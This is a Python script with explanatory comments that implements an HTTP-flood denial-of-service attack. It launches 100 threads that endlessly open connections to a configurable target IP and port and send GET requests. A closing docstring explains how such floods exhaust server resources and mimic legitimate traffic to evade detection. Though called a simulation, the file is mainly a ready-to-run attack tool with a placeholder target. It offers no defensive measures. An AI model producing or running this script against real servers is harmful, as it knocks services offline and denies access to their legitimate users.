'''
Code: DoS Attack Using SOcket Programming

This code is a simple script to simulate a DoS and DDoS attack using socket programming in Python. It targets a 
specific IP address and port, continuously sending HTTP GET requests to overwhelm the server. The `attack` 
function creates a socket connection to the target, sends HTTP GET requests, and then closes the connection. 
The script launches multiple threads (100 in this case) to increase the intensity of the attack. Each thread 
runs the `attack` function in a loop, generating constant traffic to the target server.

'''

import socket    #  socket module allows us to create and use network connections.
import threading    # threading module enables us to run multiple threads concurrently

target_ip = "111.11.11.111"  # Replace with the IP address of the target machine
target_port = 8080  # variable stores the port number on the target machine that you want to attack.

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # This creates a new socket object s for connecting to the 
                                                              # target using the IPv4 protocol (AF_INET) and TCP (SOCK_STREAM).

        s.connect((target_ip, target_port)) # This line connects the socket s to the target IP address and port.

        s.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))   # This sends an HTTP GET request line to the target. 
                                                                    # sending an HTTP GET request is a way to simulate a type of 
                                                                    # denial-of-service (DoS) attack known as an HTTP flood. 
                                                                    # --> Explaination given below 

        s.sendto(b"Host: " + bytes(target_ip, 'utf-8') + b"\r\n\r\n", (target_ip, target_port)) # This sends the Host header, which is 
                                                                                            # required by HTTP/1.1 to specify the host being 
                                                                                            # requested. The \r\n\r\n at the end indicates the 
                                                                                            # end of the HTTP request headers.
        s.close() # closes the socket connection after the request has been sent.

# Number of threads to launch
num_threads = 100

for i in range(num_threads):
    thread = threading.Thread(target=attack)
    thread.start()

'''
Reasons for Sending an HTTP GET Request in the Attack

1. Overwhelm the Server: The purpose of the attack is to overwhelm the server with a high volume of requests. By sending a large number 
of HTTP GET requests, the attacker aims to exhaust the server's resources (such as CPU, memory, and bandwidth), making it slow or 
unresponsive to legitimate users.

2. Simulate Real Traffic: HTTP GET requests are commonly used to retrieve resources from a web server, such as web pages or images. 
By using GET requests, the attack can mimic regular traffic, making it harder for the server to distinguish between legitimate users 
and malicious traffic.

3. Easy to Implement: Sending HTTP GET requests is straightforward and can be done with basic socket programming. This makes it a simple
method to demonstrate how a DoS attack works.

'''